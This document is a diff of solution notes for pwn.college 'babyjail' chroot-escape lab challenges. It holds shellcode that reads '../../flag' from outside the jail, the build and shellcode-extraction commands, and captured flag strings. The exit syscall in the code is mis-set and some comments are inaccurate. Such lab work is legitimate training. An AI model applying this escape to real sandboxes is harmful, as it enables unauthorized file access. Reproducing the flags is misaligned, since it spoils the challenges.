@@ -36,17 +36,54 @@ int main()
 
 }
 
-gcc -o jail jail1.c
+gcc -o jail jail2.c
 ./jail
 
 cd /
 run /challenge/babyjail1 ./flag
 pwn.college{c5Ky7b88agQecU5IesTZZp5Eeas.QXxMjMscTOxUzW}
 
+# 2
+# s file
+.global _start
+.intel_syntax noprefix
+_start:
+    # open files
+    mov rsi, 0
+    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
+    mov rax, 2              #syscall 2 opens file
+    syscall
 
+    #read files
+    mov rdi, rax    #file saved in rax from above syscall
+    mov rsi, rsp    #move file to readable register
+    mov rdx, 100    # reads 100 bytes
+    mov rax, 0
+    syscall
 
+    #write files
+    mov rdi, 1      #write to stdout
+    mov rsi, rsp    #moves file to write 
+    mov rdx, rax    #reads # of bytes to write
+    mov rax, 1
+    syscall
 
+    #exit
+    mov rax, 60
+    mov rax, 42
+    syscall
 
+#\0 is null terminating for strings
+flag:
+    .ascii "../../flag\0"
+
+gcc -nostdlib -o solve.elf open.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+
+/challenge/babyjail2 ../../etc/passwd < solve.bin
+pwn.college{sogg6R3HB6XibHocY0FRCQOPDYJ.QXyMjMscTOxUzW}
 
 
 
